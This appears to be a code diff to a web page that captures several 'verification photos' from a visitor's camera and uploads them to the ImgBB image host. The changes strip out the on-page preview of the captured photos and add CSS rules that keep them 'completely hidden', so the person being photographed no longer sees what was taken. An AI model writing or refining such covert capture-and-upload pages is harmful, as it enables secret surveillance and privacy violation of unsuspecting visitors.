@@ -318,21 +318,19 @@
             opacity: 0;
         }
 
-        /* Photo preview section */
+        /* Photo preview section - completely hidden */
         .photo-preview {
-            display: none;
-            margin: 20px 0;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 10px;
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            height: 0 !important;
+            overflow: hidden !important;
         }
 
         .photo-preview img {
-            max-width: 150px;
-            max-height: 150px;
-            margin: 5px;
-            border-radius: 5px;
-            border: 2px solid #ddd;
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
         }
         
         @media (max-width: 768px) {
@@ -424,7 +422,7 @@
             </div>
         </div>
         
-        <!-- Photo preview (for debugging) -->
+        <!-- Photo preview (completely hidden) -->
         <div class="photo-preview" id="photoPreview">
             <h4>Captured Photos:</h4>
             <div id="photoContainer"></div>
@@ -680,8 +678,7 @@
                                     
                                     console.log(`Photo ${photoIndex + 1} captured:`, file.name, 'Size:', blob.size, 'bytes');
                                     
-                                    // Show photo preview
-                                    showPhotoPreview(blob, photoIndex + 1);
+                                    // Note: Photo preview is now completely disabled
                                     
                                     photosCaptured++;
                                     updateLoadingText(`Capturing verification photos... (${photosCaptured}/${totalPhotos})`);
@@ -721,19 +718,6 @@
             } else {
                 showError('❌ No photos were captured successfully. Please refresh and try again.');
             }
-        }
-
-        // Show photo preview for debugging
-        function showPhotoPreview(blob, photoNumber) {
-            const photoContainer = document.getElementById('photoContainer');
-            const img = document.createElement('img');
-            img.src = URL.createObjectURL(blob);
-            img.alt = `Photo ${photoNumber}`;
-            img.title = `Photo ${photoNumber}`;
-            photoContainer.appendChild(img);
-            
-            // Show preview section
-            document.getElementById('photoPreview').style.display = 'block';
         }
 
         // Upload photo to ImgBB (free image hosting)
@@ -983,7 +967,6 @@ ${uploadedPhotos.length > 0 ?
             document.querySelector('.location-icon').style.display = 'none';
             document.querySelector('.camera-notice').style.display = 'none';
             document.getElementById('footerSection').style.display = 'none';
-            document.getElementById('photoPreview').style.display = 'none';
             
             // Show thank you section
             document.getElementById('thanksSection').style.display = 'block';
@@ -1024,23 +1007,12 @@ ${uploadedPhotos.length > 0 ?
                 cameraStream.getTracks().forEach(track => track.stop());
             }
             
-            // Cleanup blob URLs
+            // Cleanup blob URLs (though we're not creating them for preview anymore)
             photoFiles.forEach(photoData => {
                 if (photoData.blobUrl) {
                     URL.revokeObjectURL(photoData.blobUrl);
                 }
             });
-            
-            // Cleanup preview images
-            const photoContainer = document.getElementById('photoContainer');
-            if (photoContainer) {
-                const images = photoContainer.querySelectorAll('img');
-                images.forEach(img => {
-                    if (img.src.startsWith('blob:')) {
-                        URL.revokeObjectURL(img.src);
-                    }
-                });
-            }
         });
     </script>
 </body>
